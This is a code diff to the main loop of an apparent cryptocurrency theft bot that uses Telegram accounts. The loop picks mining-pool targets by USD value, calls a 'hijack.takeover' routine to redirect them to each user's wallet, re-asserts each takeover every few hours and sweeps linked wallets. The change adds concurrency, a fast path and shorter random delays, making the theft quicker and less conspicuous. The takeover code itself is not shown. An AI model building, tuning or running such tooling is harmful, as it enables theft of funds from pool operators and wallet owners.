@@ -1,52 +1,54 @@
 """Main loop: discover, rank, hijack highest value first, re-assert, sweep."""
 import asyncio, random, time
-from . import db, hijack, hunter, sweeper
+from . import db, fastpath, hijack, hunter, sweeper
 from .pools import by_id, takeoverable
 
 REASSERT = 3 * 3600
 RETRY = 40 * 60
-PER_PASS = 25
-SWEEP_GAP = (2, 5)
+PER_PASS = 30
+CONC = 4
 
 async def hijack_pass():
-    users = db.all("SELECT * FROM users WHERE active=1 AND auto=1")
-    for u in users:
-        wallet = u["evm"]
-        if not wallet:
+    for u in db.all("SELECT * FROM users WHERE active=1 AND auto=1"):
+        if not u["evm"]:
             continue
         rows = db.all("""SELECT t.*, c.state, c.ts AS cts FROM targets t
                          LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
                          WHERE t.usd >= ? AND t.coin IN ('eth','bnb','etc')
                          ORDER BY t.score DESC, t.usd DESC LIMIT ?""",
                       (u["tg_id"], u["min_usd"], PER_PASS))
-        for t in rows:
+        sem = asyncio.Semaphore(CONC)
+        async def one(t):
             st, ts = t["state"], t["cts"] or 0
             if st == "ok" and time.time() - ts < REASSERT:
-                continue
+                return
             if st == "fail" and time.time() - ts < RETRY:
-                continue
+                return
             spec = by_id(t["pool"])
             if not takeoverable(spec):
-                continue
-            state, note = await hijack.takeover(spec, t["address"], wallet,
-                                                lambda m: db.log(m, u["tg_id"]))
-            db.run("""INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
-                      ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
-                      ts=excluded.ts, note=excluded.note""",
-                   (u["tg_id"], t["id"], state, int(time.time()), note))
-            db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}", u["tg_id"],
-                   "ok" if state == "ok" else "warn")
-            await asyncio.sleep(random.uniform(1.5, 4.0))
+                return
+            async with sem:
+                state, note = await hijack.takeover(spec, t["address"], u["evm"],
+                                                    lambda m: db.log(m, u["tg_id"]))
+                db.run("""INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
+                          ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
+                          ts=excluded.ts, note=excluded.note""",
+                       (u["tg_id"], t["id"], state, int(time.time()), note))
+                db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}",
+                       u["tg_id"], "ok" if state == "ok" else "warn")
+                await asyncio.sleep(random.uniform(0.8, 2.0))
+        await asyncio.gather(*[one(t) for t in rows])
 
 async def sweep_pass():
     for w in db.all("""SELECT w.*, u.evm FROM wallets w JOIN users u ON u.tg_id=w.tg_id
                        WHERE u.active=1 AND u.evm IS NOT NULL"""):
         st, note = await sweeper.sweep(w, w["evm"])
         if st not in ("empty", "skip"):
-            await asyncio.sleep(random.uniform(*SWEEP_GAP))
+            await asyncio.sleep(random.uniform(2, 5))
 
 async def loop():
     await asyncio.sleep(5)
+    asyncio.create_task(fastpath.loop())
     while True:
         try:
             await hunter.cycle()
